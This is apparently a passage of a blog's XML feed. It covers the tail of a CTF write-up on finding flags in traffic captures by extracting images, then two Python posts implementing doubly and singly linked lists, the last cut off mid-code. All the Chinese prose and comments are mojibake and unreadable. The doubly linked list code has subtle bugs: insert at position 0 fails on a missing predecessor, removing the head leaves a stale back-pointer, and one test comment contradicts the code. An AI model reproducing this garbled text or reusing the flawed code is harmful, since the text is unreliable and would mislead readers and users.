title="MISC"></a>MISC</h3><p>ç®€å•è®²è®²å§ï¼Œæˆ‘æœ‰ç‚¹æ‡’å°±ä¸æƒ³å¤šè¯´äº†<br>ä¸¤ä¸ªé¢˜ç›®æµé‡åˆ†æé¢˜ç›®çš„æ€è·¯éƒ½æ˜¯ä¸€è‡´çš„å…ˆæ‰¾åˆ°åº”ç”¨å±‚çš„æ¯ä¸€æ¬¡ä¼šè¯ï¼Œç„¶ååœ¨å“åº”é‡Œé¢æ‰¾åˆ°å¯¹åº”çš„ä¼ é€ä¿¡æ¯ï¼Œä¸¤ä¸ªé¢˜ç›®éƒ½æ˜¯å›¾ç‰‡ã€‚ã€‚<br><a href="https://imgchr.com/i/P9MNVK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9MNVK.md.png" alt="P9MNVK.md.png"></a></p><p>è¿™æ˜¯å…¶ä¸­ä¸€ä¸ªåŒ…é‡Œé¢çš„å›¾ç‰‡ï¼Œç›´æ¥åˆ©ç”¨<code>html</code>çš„åŠŸèƒ½å°±å¥½<br><img src="https://s1.ax1x.com/2018/06/23/P9Ma5D.png" alt="P9Ma5D.png"><br>å¾—åˆ°flag</p><p>å¦å¤–ä¸€ä¸ªåŒ…ç›´æ¥é€‰æ‹©åˆ†ç»„å­—èŠ‚æµæå–å‡ºæ¥ç›´æ¥ä¿å­˜ä¸ºå›¾ç‰‡å°±å¥½,ç„¶å<code>notepad++</code>æ‰“å¼€ï¼Œæœ€åä¸€è¡Œå°±æ˜¯flag<br><img src="https://s1.ax1x.com/2018/06/23/P9M6qP.png" alt="P9M6qP.png"></p><p>æœ€åä¸€é¢˜Miscå¥½åƒæ˜¯æŸä¸€ä¸ªæ¯”èµ›çš„åŸé¢˜ã€‚ã€‚ã€‚flagä¹Ÿæ²¡æ”¹ï¼Œè€ƒäº†ä¸€æ³¢éŸ³é¢‘é‡Œé¢è—æ°´å°ï¼ŒåŠ ä¸€æ¬¡å›¾ç‰‡çš„ä¼¸ç¼©ï¼Œæœ¬äººç”µè„‘æ²¡æœ‰<code>MATLAB</code>å°±ä¸å¼„äº†</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>åšå®Œè¿™é¢˜ç›®ä¸‹åˆåšå¾®æœºå®éªŒæ±‡ç¼–æ‡µå¾—ä¸€æ‰¹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚å¤´æ™•</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°æ®ç»“æ„å¤ä¹ äºŒ åŒå‘é“¾è¡¨(pythonå®ç°)</title>
      <link href="/python-DataStruct-2.html"/>
      <url>/python-DataStruct-2.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p> ç«¯åˆå‡æœŸå·®ä¸å¤šç»“æŸäº†ï¼Œæ„Ÿè§‰ç¦»æš‘å‡åˆé è¿‘äº†ï¼Œå¥½åƒæˆ‘ä»¬å­¦æ ¡æ”¾å‡æ¯”è¾ƒæ™šï¼Œè¿˜æ˜¯åˆ«æƒ³æ”¾å‡çš„äº‹æƒ…äº†ï¼Œæˆ‘è¿˜æ˜¯ä¹–ä¹–å»å¤ä¹ æˆ‘çš„æ¦‚ç‡(æ±‚äºŒé‡ç§¯åˆ†å…¨éƒ½å¿˜å…‰äº†ï¼Œé‡æ–°æ‹¿èµ·é«˜æ•°å¥‹æ–—)ï¼Œ<br> <a id="more"></a>å¾®æœº(å®éªŒå†™æ±‡ç¼–å¯¹æŒ‡ä»¤ä¸ç†Ÿ)ï¼Œè®¡ç½‘(å­ç½‘è·Ÿè¶…ç½‘çš„é¢˜ç›®è¿˜ä¸ç†Ÿç»ƒ)ï¼ŒåŒå‘é“¾è¡¨å…¶å®å°±æ˜¯æ¯”å•å‘é“¾è¡¨çš„èŠ‚ç‚¹å¤šäº†ä¸€ä¸ªå‰é©±ç»“ç‚¹çš„éƒ¨åˆ†ï¼Œè™½ç„¶ç®€å•ä½†æ˜¯è¿˜æ˜¯åœ¨ç¼–å†™æ—¶å‡ºç°é—®é¢˜ï¼Œå‡ºç°é—®é¢˜å°±å€¼å¾—å»è®°å½•</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>åŒå‘é“¾è¡¨çš„å®ç°ï¼Œè¿™ä¸ªåŒå‘é“¾è¡¨æ¯”æ˜¨å¤©å†™çš„å¤šäº†ä¸€ç‚¹ç‚¹è€Œè€Œå·²ï¼Œå¤´ç»“ç‚¹çš„å‰é©±èŠ‚ç‚¹é»˜è®¤æ˜¯<code>None</code>ï¼Œè€Œä¸”åœ¨éå†ï¼Œæœç´¢ä»¥åŠåˆ¤ç©ºç­‰æ­¥éª¤éƒ½æ˜¯ä¸æ˜¨å¤©çš„å†™æ³•ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥å°è¯•<code>import</code>ä¸€ä¸‹æ˜¨å¤©çš„æ–‡ä»¶ï¼Œè®©ä»Šå¤©çš„åŒå‘é“¾è¡¨ç»§æ‰¿æ˜¨å¤©çš„å•å‘é“¾è¡¨çš„ç›¸åŒæ“ä½œ<br>(python 3.5å®ç°)</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, elem)</span>:</span></span><br><span class="line">        self.elem = elem</span><br><span class="line">        self.next = <span class="keyword">None</span></span><br><span class="line">        self.prev = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubleLinkList</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, node=None)</span>:</span> <span class="comment">#è¿™é‡Œé»˜è®¤ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„å‰é©±æŒ‡é’ˆæŒ‡çš„æ˜¯None</span></span><br><span class="line">        self.__head = node <span class="comment">#ç§æœ‰åŒ–</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__head <span class="keyword">is</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(self)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">travel</span><span class="params">(self)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            print(cur.elem, end=<span class="string">" "</span>)</span><br><span class="line">            cur = cur.next  <span class="comment">#è¿™ä¸¤å¥è¯é¡ºåºä¸èƒ½è°ƒæ¢</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##å…¶å®ä¸Šé¢çš„éƒ½ä¸ç”¨æ”¹</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        node.next = self.__head</span><br><span class="line">        self.__head = node</span><br><span class="line">        <span class="keyword">if</span> node.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            node.next.prev = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self,item)</span>:</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        <span class="keyword">if</span> self.is_empty():</span><br><span class="line">            self.__head = node</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur = self.__head</span><br><span class="line">            <span class="keyword">while</span> cur.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">               cur = cur.next</span><br><span class="line">            node.next = cur.next</span><br><span class="line">            node.prev = cur</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, pos, item)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> pos &lt; <span class="number">0</span>:</span><br><span class="line">             self.add(item)</span><br><span class="line">        <span class="keyword">elif</span> pos &gt; self.length()<span class="number">-1</span>:</span><br><span class="line">            self.append(item)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            cur = self.__head</span><br><span class="line">            node = Node(item)</span><br><span class="line">            <span class="keyword">while</span> count &lt; pos:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                cur = cur.next</span><br><span class="line">            node.next = cur</span><br><span class="line">            node.prev = cur.prev</span><br><span class="line">            cur.prev.next = node</span><br><span class="line">            cur.prev = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">if</span> cur == self.__head:</span><br><span class="line">                    <span class="comment"># åˆ¤æ–­é“¾è¡¨æ˜¯å¦åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹,ä¸æ˜¯çš„è¯å°±æ‰§è¡Œè¿™ä¸€æ¡ä»¶è¯­å¥</span></span><br><span class="line">                    self.__head = <span class="keyword">None</span></span><br><span class="line">                    <span class="keyword">if</span> cur.next:</span><br><span class="line">                        self.__head = cur.next</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cur.prev.next = cur.next</span><br><span class="line">                    <span class="keyword">if</span> cur.next:</span><br><span class="line">                        cur.next.prev = cur.prev</span><br><span class="line">                <span class="keyword">break</span>   <span class="comment">#æ³¨æ„ä¸‹è¿™é‡Œçš„breakï¼Œä¸è¦å¿˜äº†</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># test_1</span></span><br><span class="line">    lst = DoubleLinkList()</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    print(lst.length())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_2</span></span><br><span class="line">    lst.append(<span class="number">2</span>)</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    lst.add(<span class="number">3</span>) <span class="comment"># 3 2</span></span><br><span class="line">    lst.insert(<span class="number">1</span>, <span class="number">5</span>)   <span class="comment"># 3  1  5 2</span></span><br><span class="line">    lst.add(<span class="number">4</span>)    <span class="comment"># 4 3  5 2</span></span><br><span class="line">    lst.append(<span class="number">6</span>)  <span class="comment"># 4 3  5 2 6</span></span><br><span class="line">    print(lst.search(<span class="number">5</span>))</span><br><span class="line">    lst.travel()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_3</span></span><br><span class="line">    lst.remove(<span class="number">5</span>)</span><br><span class="line">    lst.remove(<span class="number">4</span>)</span><br><span class="line">    lst.remove(<span class="number">6</span>)</span><br><span class="line">    lst.travel()</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™é‡Œæˆ‘è®°å½•ä¸€ä¸‹æˆ‘å‡ºç°çš„å‡ ä¸ªé—®é¢˜<br>ç¬¬ä¸€ï¼Œå„èŠ‚ç‚¹çš„é“¾æ¥æ“ä½œä¸€å®šè¦æ³¨æ„é¡ºåºï¼Œæ¯”å¦‚åœ¨éå†çš„æ—¶å€™è¿›å…¥å¾ªç¯åæ˜¯å…ˆè¿›è¡Œè¾“å‡ºæ“ä½œï¼Œå†æŠŠæŒ‡é’ˆç§»åˆ°ä¸‹ä¸€ä½ç­‰ç­‰<br>ç¬¬äºŒï¼Œæ¯ä¸€ç§æ“ä½œéƒ½è¦æ³¨æ„è€ƒè™‘å•ä¸ªèŠ‚ç‚¹ï¼Œæ˜¯å¦ä¸ºå¤´ç»“ç‚¹ï¼Œå°¾èŠ‚ç‚¹çš„é—®é¢˜ï¼Œç„¶åå»ç»™å‡ºä¸€å®šçš„æ¡ä»¶å»æ§åˆ¶ï¼Œä¸ç„¶å¾ˆå®¹æ˜“å‡ºé”™ï¼Œåœ¨å†™<code>removeæ“ä½œ</code>çš„æ—¶å€™æˆ‘å°±åœ¨è€ƒè™‘å®Œå¤´ç»“ç‚¹ä¹‹åå°±æ²¡æœ‰è€ƒè™‘æ˜¯å¦ä¸ºå•ä¸ªèŠ‚ç‚¹çš„æƒ…å†µï¼Œå¯¼è‡´ç¨‹åºå‡ºé”™ï¼Œ<br>ç¬¬ä¸‰ï¼Œæ³¨æ„<code>removeæ“ä½œ</code>çš„<code>break</code>ï¼Œè¿™ä¸€ç‚¹æˆ‘è¿˜æ˜¯ç”¨<code>debuggeråŠŸèƒ½</code>ä¸€ç›´<code>F7 F8 F9</code>æ‰¾å‡ºæ¥çš„ã€‚ã€‚ã€‚å°±å‘ç°ä¸€ç›´åœ¨é‚£ä¸ªå‡½æ•°é‡Œé¢ä¸å‡ºæ¥ï¼Œä¸€ç›´å¾ªç¯æ‰æƒŠé†’è¦åŠ breakï¼Œ23333<br>æ—©æ—©ç¡è§‰ï¼Œæ˜å¤©æ—©èµ·å¤ä¹ æ¦‚ç‡è®º!!!!!!</p>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ç¼–ç¨‹è¯­è¨€ </tag>
            
            <tag> æ•°æ®ç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°æ®ç»“æ„å¤ä¹ ä¸€ å•é“¾è¡¨(pythonå®ç°)</title>
      <link href="/python-DataStruct-1.html"/>
      <url>/python-DataStruct-1.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ä¹ ä¸€ä¸‹æ•°æ®ç»“æ„ï¼Œæ„Ÿè§‰ç”Ÿç–äº†ï¼Œç”¨pythoné‡æ–°å†™ä¸€éå§<br><a id="more"></a> </p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="å•é“¾è¡¨çš„å®ç°"><a href="#å•é“¾è¡¨çš„å®ç°" class="headerlink" title="å•é“¾è¡¨çš„å®ç°"></a>å•é“¾è¡¨çš„å®ç°</h3><p>è¿™é‡Œç”±äºpythonå˜é‡çš„ç‰¹æ®Šæ€§ï¼Œpythonå˜é‡ç›¸å½“äºç»´æŠ¤çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œä¸åƒå…¶ä»–è¯­è¨€çš„çš„å˜é‡ä¸€æ ·è¦äº‹å…ˆå®šä¹‰è‡ªèº«çš„ç±»å‹ï¼Œè¿™å°±ä½¿å¾—pythonå®ç°å•é“¾è¡¨æ¯”è¾ƒæ–¹ä¾¿ï¼Œè‡ªæˆ‘æ„Ÿè§‰ã€‚ã€‚ã€‚ã€‚æ¯”å¦‚åœ¨Cè¯­è¨€é‡Œé¢è®¾å®šäº†intç±»å‹çš„å˜é‡ï¼Œä½ åªèƒ½å¤Ÿå¾€é‡Œé¢å­˜æ”¾æ•´å½¢æ•°æ®ï¼Œè€Œä¸”æ˜¯ç›´æ¥å¯¹åº”çš„æ•°æ®ï¼Œä½†æ˜¯pythonçš„å˜é‡ç±»å‹ç›´æ¥æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå°±ä¾‹å¦‚ <code>a = 20</code>, å…¶å®è¿™é‡Œçš„aå­˜æ”¾çš„æ˜¯20è¿™ä¸ªæ•°çš„åœ°å€ï¼Œ é€šè¿‡aå°±å¯ä»¥æ‰¾åˆ°20è¿™ä¸ªæ•°å­—äº†ã€‚ã€‚è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆPythoné‡Œé¢å¯ä»¥è¿™æ ·å»æŠŠä¸¤ä¸ªæ•°è°ƒæ¢ï¼Œæ¯”å¦‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="number">20</span> </span><br><span class="line">b = <span class="number">30</span> </span><br><span class="line">a, b = b , a</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯å•é“¾è¡¨å®ç°ä»£ç (python 3.5)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, elem)</span>:</span></span><br><span class="line">        self.elem = elem</span><br><span class="line">        self.next = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleLinklist</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, node=None)</span>:</span></span><br><span class="line">        self.__head = node  <span class="comment">#è¿™é‡Œç”¨äº†__æ¥å®ç°ä¸€å®šç¨‹åº¦çš„ç§æœ‰åŒ–ï¼Œå› ä¸ºç”¨æˆ·ä¸€èˆ¬ä¸éœ€è¦çŸ¥é“è¿™ä¸ªå‚æ•°çš„å­˜åœ¨</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span>  <span class="comment">#åˆ¤æ–­æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">        <span class="keyword">return</span> (self.__head == <span class="keyword">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(self)</span>:</span> <span class="comment">#è·å–é•¿åº¦</span></span><br><span class="line">        cur = self.__head <span class="comment">#è®¾ç½®æ¸¸æ ‡ï¼Œç±»ä¼¼äºCé‡Œé¢çš„æŒ‡é’ˆ</span></span><br><span class="line">        count = <span class="number">0</span> <span class="comment">#æœ€å¥½è®¾ç½®ä¸º0ï¼Œä¸ç„¶çš„è¯ä¸‹é¢çš„æ¡ä»¶å¯èƒ½ä¹Ÿçœ‹æƒ…å†µå˜åŒ–ï¼Œä¸ªäººæ„Ÿè§‰è¿™æ ·å¥½ç†è§£</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">travel</span><span class="params">(self)</span>:</span> <span class="comment">#éå†ä¸€éé“¾è¡¨ï¼Œè¿™ä¸ªè·Ÿè·å–é•¿åº¦å°±å·®ä¸å¤š</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            print(cur.elem,end=<span class="string">" "</span>)</span><br><span class="line">            cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,item)</span>:</span> <span class="comment">#å¤´æ’æ³•</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        node.next = self.__head</span><br><span class="line">        self.__head = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self,item)</span>:</span> <span class="comment">#å°¾æ’æ³•</span></span><br><span class="line">        node = Node(item)</span><br><span class="line">        <span class="keyword">if</span> self.is_empty():</span><br><span class="line">            self.__head = node</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur = self.__head</span><br><span class="line">            <span class="keyword">while</span> cur.next <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, pos, item )</span>:</span> <span class="comment">#åœ¨æŸä¸ªä½ç½®æ’å…¥æ•°å­—</span></span><br><span class="line">        <span class="keyword">if</span> pos &lt; <span class="number">0</span>:</span><br><span class="line">            self.add(item)  <span class="comment"># ä½ç½®å°äº0çš„æ—¶å€™é»˜è®¤å¤´æ’æ³•</span></span><br><span class="line">        <span class="keyword">elif</span> pos&gt; self.length()<span class="number">-1</span>:</span><br><span class="line">            self.append(item) <span class="comment"># ä½ç½®å¤§äºé•¿åº¦ï¼Œé»˜è®¤å°¾æ’æ³•ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ç­‰äºå·ä¼šè¯¯æ’</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pre = self.__head</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            node = Node(item)</span><br><span class="line">            <span class="keyword">while</span> count &lt; pos<span class="number">-1</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                pre = pre.next</span><br><span class="line">            node.next = pre.next</span><br><span class="line">            pre.next = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, item)</span>:</span> <span class="comment">#é»˜è®¤åˆ é™¤ä¸€ä¸ªæ‰¾åˆ°çš„èŠ‚ç‚¹</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        pre = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item: <span class="comment">#æ‰¾åˆ°äº†çš„è¯</span></span><br><span class="line">                <span 